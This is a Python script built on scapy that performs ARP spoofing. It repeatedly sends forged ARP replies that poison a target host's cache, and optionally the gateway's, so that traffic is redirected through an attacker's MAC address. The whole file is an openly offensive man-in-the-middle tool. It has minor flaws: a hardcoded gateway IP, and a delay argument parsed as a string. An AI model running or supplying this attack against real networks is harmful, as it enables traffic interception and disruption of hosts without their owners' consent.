from time import sleep
import argparse
from scapy.all import *

def main():
	parser = argparse.ArgumentParser(description='Spoof ARP tables')
	parser.add_argument('-i', '--iface', type=str, help='Interface you wish to use')
	parser.add_argument('-s', '--src', type=str, help='The address you want for the attacker')        
	parser.add_argument('-d', '--delay', type=str, help='Delay (in seconds) between messages')
	parser.add_argument('-gw', help='should GW be attacked as well?', action='store_true')
	parser.add_argument('-t', '--target', type=str, help='IP of target', required=True)
	args = parser.parse_args()

	iface = args.iface
	src = args.src
	delay = args.delay
	gw = args.gw
	target = args.target

	if not iface:
		iface = 'eth0'
	if not src:
		src = get_if_hwaddr(iface)
	if not delay:
		delay = 1
	if not gw:
		gw = False
	
	gw_ip = get_gw_ip(iface)
	while True:
		send_ARP_response(iface, src, target, gw, gw_ip)
		sleep(delay)

def send_ARP_response(iface, src, target, gw, gw_ip):
	send_is_at(iface, target, src, gw_ip)
	if gw:
		send_is_at(iface, gw_ip, src, target)


# TODO: get real gw address
def get_gw_ip(iface):
	return '192.168.1.1'

def send_is_at(iface, target, src, ip):
	dst_mac = get_mac_by_ip(target)
	packet = Ether(dst=dst_mac, src=src) / ARP(op=2, hwsrc=src, psrc=ip, hwdst=dst_mac, pdst=target)
	sendp(packet)

def get_mac_by_ip(dst_ip):
	my_ip = get_if_addr(conf.iface)
	response = sr(ARP(op=1, psrc=my_ip, pdst=dst_ip), timeout=5)
	return response[0][ARP][0][1].hwsrc

if __name__ == "__main__":
	main()